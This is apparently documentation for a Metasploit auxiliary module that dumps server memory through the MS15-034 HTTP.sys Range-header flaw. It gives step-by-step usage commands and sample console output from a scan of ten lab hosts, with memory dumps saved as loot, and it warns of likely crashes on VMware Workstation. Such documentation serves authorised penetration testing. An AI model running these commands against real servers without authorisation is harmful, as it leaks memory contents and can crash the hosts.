##Description

This module dumps memory contents using a crafted Range header and affects only Windows 8.1, Server 2012, and Server 2012R2. Note that if the target is running in VMware Workstation, this module has a high likelihood of resulting in BSOD; however, VMware ESX and non-virtualized hosts seem stable. Using a larger target file should result in more memory being dumped, and SSL seems to produce more data as well.

## Verification Steps

1. Do: ```use auxiliary/scanner/http/ms15_034_http_sys_memory_dump```
2. Do: ```set RHOSTS [IP]```
3. Do: ```set RPORT [PORT]```
4. Do: ```run```

## Sample Output
```
msf > use auxiliary/scanner/http/ms15_034_http_sys_memory_dump
msf auxiliary(ms15_034_http_sys_memory_dump) > set RHOSTS 10.10.141.11-20
RHOSTS => 10.10.141.11-20
msf auxiliary(ms15_034_http_sys_memory_dump) > set RPORT 80
RPORT => 80
msf auxiliary(ms15_034_http_sys_memory_dump) > show options

Module options (auxiliary/scanner/http/ms15_034_http_sys_memory_dump):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS            10.10.141.11-20  yes       The target address range or CIDR identifier
   RPORT             80               yes       The target port
   SSL               false            no        Negotiate SSL/TLS for outgoing connections
   SUPPRESS_REQUEST  true             yes       Suppress output of the requested resource
   TARGETURI         /                no        URI to the site (e.g /site/) or a valid file resource (e.g /welcome.png)
   THREADS           1                yes       The number of concurrent threads

msf auxiliary(ms15_034_http_sys_memory_dump) > exploit

[+] Target may be vulnerable...
[+] Stand by...

[+] Memory contents:


[*] Memory dump saved to /root/.msf4/loot/20170320143459_default_10.10.141.11_iis.ms15034_241505.bin
[*] Scanned  1 of 10 hosts (10% complete)
[+] Target may be vulnerable...
[+] Stand by...

[+] Memory contents:


[*] Memory dump saved to /root/.msf4/loot/20170320143459_default_10.10.141.12_iis.ms15034_783265.bin
[*] Scanned  2 of 10 hosts (20% complete)
[+] Target may be vulnerable...
[+] Stand by...

[+] Memory contents:


[*] Memory dump saved to /root/.msf4/loot/20170320143459_default_10.10.141.13_iis.ms15034_433508.bin
[*] Scanned  3 of 10 hosts (30% complete)
[+] Target may be vulnerable...
[+] Stand by...

[+] Memory contents:


[*] Memory dump saved to /root/.msf4/loot/20170320143500_default_10.10.141.14_iis.ms15034_663607.bin
[*] Scanned  4 of 10 hosts (40% complete)
[+] Target may be vulnerable...
[+] Stand by...

[+] Memory contents:


[*] Memory dump saved to /root/.msf4/loot/20170320143500_default_10.10.141.15_iis.ms15034_695505.bin
[*] Scanned  5 of 10 hosts (50% complete)
[+] Target may be vulnerable...
[+] Stand by...

[+] Memory contents:


[*] Memory dump saved to /root/.msf4/loot/20170320143501_default_10.10.141.16_iis.ms15034_254486.bin
[*] Scanned  6 of 10 hosts (60% complete)
[+] Target may be vulnerable...
[+] Stand by...

[+] Memory contents:


[*] Memory dump saved to /root/.msf4/loot/20170320143502_default_10.10.141.17_iis.ms15034_393454.bin
[*] Scanned  7 of 10 hosts (70% complete)
[+] Target may be vulnerable...
[+] Stand by...

[+] Memory contents:


[*] Memory dump saved to /root/.msf4/loot/20170320143502_default_10.10.141.18_iis.ms15034_330159.bin
[*] Scanned  8 of 10 hosts (80% complete)
[+] Target may be vulnerable...
[+] Stand by...

[+] Memory contents:


[*] Memory dump saved to /root/.msf4/loot/20170320143503_default_10.10.141.19_iis.ms15034_165710.bin
[*] Scanned  9 of 10 hosts (90% complete)
[+] Target may be vulnerable...
[+] Stand by...

[+] Memory contents:


[*] Memory dump saved to /root/.msf4/loot/20170320143504_default_10.10.141.20_iis.ms15034_980170.bin
[*] Scanned 10 of 10 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(ms15_034_http_sys_memory_dump) > 
```
